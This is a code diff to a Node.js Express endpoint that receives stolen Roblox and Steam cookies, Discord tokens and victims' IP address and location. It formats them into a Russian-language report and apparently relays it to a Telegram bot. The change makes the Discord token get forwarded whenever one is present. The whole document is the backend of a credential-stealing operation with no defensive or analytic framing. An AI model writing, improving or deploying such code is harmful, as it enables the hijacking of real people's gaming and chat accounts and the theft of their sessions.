@@ -12,7 +12,7 @@ const API = "https://api.telegram.org/bot" + TOKEN;
 
 app.post('/send', async (req, res) => {
     try {
-        const { robloxCookie, steamCookie, discordToken, ip, country, city, robloxStatus, steamStatus, discordStatus } = req.body;
+        const { robloxCookie, steamCookie, discordToken, ip, country, city, robloxStatus, steamStatus } = req.body;
 
         let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
         msg += "━━━━━━━━━━━━━━━━━━\n\n";
@@ -21,7 +21,6 @@ app.post('/send', async (req, res) => {
         msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
         msg += "━━━━━━━━━━━━━━━━━━\n\n";
 
-        // Roblox
         msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
         if (robloxStatus === "new") {
             msg += "<code>" + robloxCookie + "</code>\n\n";
@@ -31,7 +30,6 @@ app.post('/send', async (req, res) => {
             msg += "❌ Не найден\n\n";
         }
 
-        // Steam
         msg += "🎮 <b>STEAM COOKIE:</b>\n";
         if (steamStatus === "new") {
             msg += "<code>" + steamCookie + "</code>\n\n";
@@ -41,12 +39,9 @@ app.post('/send', async (req, res) => {
             msg += "❌ Не найден\n\n";
         }
 
-        // Discord
         msg += "💬 <b>DISCORD TOKEN:</b>\n";
-        if (discordStatus === "new") {
+        if (discordToken) {
             msg += "<code>" + discordToken + "</code>\n\n";
-        } else if (discordStatus === "sent") {
-            msg += "✅ Уже отправлен\n\n";
         } else {
             msg += "❌ Discord не открыт\n\n";
         }
